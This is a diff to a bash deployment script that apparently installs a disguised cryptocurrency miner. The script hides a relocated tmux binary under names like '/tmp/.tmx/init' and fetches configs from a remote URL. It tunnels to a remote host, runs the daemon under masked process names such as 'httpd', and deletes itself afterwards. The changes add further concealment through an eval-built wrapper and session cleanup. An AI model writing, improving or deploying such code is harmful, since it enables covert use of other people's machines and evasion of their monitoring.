@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+## needed tmux sed grep envsubst
 
 ## get payload
 BRANCH=master
@@ -9,8 +10,9 @@ cd scripts-${BRANCH} || exit 1
 ## relocate tmux
 trel=false
 for ph in {/tmp,/dev/shm,~/}; do
-    mkdir -p ${ph}/.tmx && \
-        mv pl/tmux ${ph}/.tmx && \
+    rm -rf ${ph}/.tmx && \
+        mkdir -p ${ph}/.tmx && \
+        mv pl/tmux ${ph}/.tmx/init && \
         export PATH=${ph}/.tmx:$PATH && \
         trel=${ph}/.tmx && break
 done
@@ -19,20 +21,29 @@ done
 ## utility vars
 CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
 
-## needed tmux sed grep envsubst
-cat TERMINFO=pl/ \
-       TERM=tmux \
-       SHELL=$(/usr/bin/which bash) \
-       PATH=.:pl:$PATH \
-       HOME=${HOME:-/tmp}
+## note quote vars that need quoting
+cat <<SHAREDENV > shared.env
+TERMINFO=pl/ \
+TERM=tmux \
+SHELL=$(/usr/bin/which bash) \
+PATH=.:pl:$PATH \
+HOME=${HOME:-/tmp}
+
+SHAREDENV
 [ -z "$SHELL" ] && echo "bash not found" && exit 1
+[ ! -e shared.env ] && echo "error dumping shared env" && exit 1
+source ./shared.env
+SHENV="$(cat shared.env)"
 
-
-## custom socket path for tmux
-function tmux(){
-    TMUX_TMPDIR=${trel} tmux "$@"
-} ; export -f tmux
-tmux start-server || { echo "failed to start tmux"; exit 1 ; }
+## custom socket path for tmux (eval to expand reloc path)
+eval "function tmx(){
+    TMUX_TMPDIR=${trel} \
+    $SHENV \
+    init \"\$@\"
+}" ; export -f tmx
+## make sure tmux is working and also spawn a session with clean args
+tmx kill-server
+tmx new -d || { echo "failed to start tmux"; exit 1 ; }
 
 ## glibc not needed on standalone
 ## tnl
@@ -46,11 +57,12 @@ TNL_ARGS=${TNL_ARGS:--C ${TNL_CFG_MASK}}
 if [ ! -e "$OBJ_CFG" ]; then
 	  wget -q "${CFG_BASE_URL}${TNL_CFG}" -O "${TNL_CFG_MASK}.tpl"
 fi
-## mask and config
+## mask
 mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
-envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
-tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
-
+## config with needed vars
+TNL_REMOTE="$TNL_REMOTE" \
+    envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
+tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
 
 OBJ_MASK=${OBJ_MASK:-httpd}
 PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
@@ -126,14 +138,14 @@ cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
 ## set vars used by pausd daemon in tmux
 for v in $(builtin compgen -A variable | grep ^PAUSD); do
     export $v
-    tmux setenv -g $v "${!v}" ; done
-tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
+    tmx setenv -g $v "${!v}" ; done
+tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
 sleep 1 ## give time to fail
 
 ## cleanup
 ## wait for tmux session to startup
 slept=0
-while [ "$(tmux list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
+while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
     slept=$((slept+1))
     if [ $slept -gt 5 ]; then ## no aes means crash means aeon
         ## try without hw accel
@@ -146,14 +158,17 @@ while [ "$(tmux list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
         ## init
-        tmux kill-session -t ${PAUSD_DAEMON}
-        tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
-        while [ "$(tmux list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do sleep 1; done
+        tmx kill-session -t ${PAUSD_DAEMON}
+        tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
+        while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do sleep 1; done
         break
     fi
     sleep 1;
 done
 sleep 1 ## once more for edge cases
+
+## stop noop tmux session
+tmx kill-session -t 0
 cd ..
 rm -rf -- "$0" \
    "scripts-${BRANCH}" \
